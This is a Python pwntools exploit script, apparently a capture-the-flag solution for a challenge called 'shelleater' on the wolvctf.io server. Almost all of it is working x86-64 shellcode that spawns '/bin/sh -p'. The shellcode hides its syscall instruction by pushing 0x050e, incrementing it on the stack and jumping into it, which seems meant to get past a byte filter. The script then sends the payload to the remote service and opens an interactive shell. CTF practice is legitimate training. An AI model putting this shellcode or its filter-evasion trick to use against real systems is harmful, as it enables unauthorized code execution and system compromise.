#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './shelleater'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'
host, port = 'shelleater.wolvctf.io', 1337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)

    shellcode = asm('''
    /* execve(path='/bin///sh', argv=['sh','-p'], envp=0) */
        /* push b'/bin///sh\x00' */
        push 0x68
        mov rax, 0x732f2f2f6e69622f
        push rax
        mov rdi, rsp
        /* push argument array ['sh\x00', '-p\x00'] */
        /* push b'sh\x00-p\x00' */
        mov rax, 0x101010101010101
        push rax
        mov rax, 0x101010101010101 ^ 0x702d006873
        xor [rsp], rax
        xor esi, esi /* 0 */
        push rsi /* null terminate */
        push 0xb
        pop rsi
        add rsi, rsp
        push rsi /* '-p\x00' */
        push 0x10
        pop rsi
        add rsi, rsp
        push rsi /* 'sh\x00' */
        mov rsi, rsp
        xor edx, edx /* 0 */
        /* call execve() */
        push 0x3b /* 0x3b */
        pop rax
        //syscall
        push 0x050e
        inc qword ptr [rsp]
        jmp rsp
        nop
    ''')
    
    print(shellcode)
    print(len(shellcode))
    io.sendline(shellcode)
    io.interactive()
    
if __name__ == '__main__':
    exploit()